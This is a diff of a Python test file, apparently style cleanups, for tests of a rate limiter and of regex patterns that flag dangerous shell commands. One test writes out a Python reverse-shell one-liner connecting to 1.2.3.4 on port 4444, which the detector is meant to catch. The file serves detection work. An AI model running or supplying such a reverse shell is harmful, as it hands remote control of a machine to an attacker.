@@ -6,9 +6,6 @@ from __future__ import annotations
 import threading
 import time
 
-import pytest
-
-
 # ---------------------------------------------------------------------------
 # #891 — Rate limiter TOCTOU race
 # ---------------------------------------------------------------------------
@@ -82,9 +79,7 @@ class TestRegexReDoSBudget:
         for p in COMPILED_DANGEROUS_PATTERNS:
             p.search(adversarial)
         elapsed = time.monotonic() - start
-        assert elapsed < 0.5, (
-            f"regex scan took {elapsed:.3f}s on adversarial input — ReDoS"
-        )
+        assert elapsed < 0.5, f"regex scan took {elapsed:.3f}s on adversarial input — ReDoS"
 
     def test_real_reverse_shell_still_detected(self):
         """The fix must not regress detection of actual reverse-shell
@@ -96,7 +91,7 @@ class TestRegexReDoSBudget:
         cmd = (
             "python -c 'import socket,os,pty;"
             "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
-            "s.connect((\"1.2.3.4\",4444));"
+            's.connect(("1.2.3.4",4444));'
             "os.dup2(s.fileno(),0)'"
         )
         hit = any(p.search(cmd) for p in COMPILED_DANGEROUS_PATTERNS)
